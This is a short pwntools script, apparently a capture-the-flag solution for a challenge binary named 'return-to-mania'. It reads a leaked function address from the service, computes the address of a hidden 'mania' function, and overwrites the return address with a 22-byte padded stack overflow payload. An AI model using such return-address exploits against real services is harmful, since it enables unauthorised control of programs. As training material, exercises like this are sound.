#!/usr/bin/env python3

from pwn import *

import os

DEBUG = 0

context.log_level = "debug" if DEBUG else "warn"

exe = ELF(".build/return-to-mania" if os.path.exists(".build/return-to-mania") else "return-to-mania")
context(binary=exe)

# Read target from the environment so `pwnmake check` can drive HOST/PORT
HOST = os.environ.get("HOST", "localhost")
PORT = int(os.environ.get("PORT", 19001))

r = remote(HOST, PORT)
# r = exe.process()

r.recvuntil(b"addr of welcome(): ")
leak = r.recvline().strip()
welcome_addr = int(leak, 16)

# leak grabs addr of welcome
info("welcome_addr: 0x%x" % welcome_addr)

mania_addr = welcome_addr - exe.symbols["welcome"] + exe.symbols["mania"]
info("mania_addr: 0x%x" % mania_addr)

payload = b"A" * 22 + p32(mania_addr)

r.sendline(payload)
r.recvuntil(b"WELCOME TO THE RING!\n")

print(r.recvline().decode(errors="replace"))
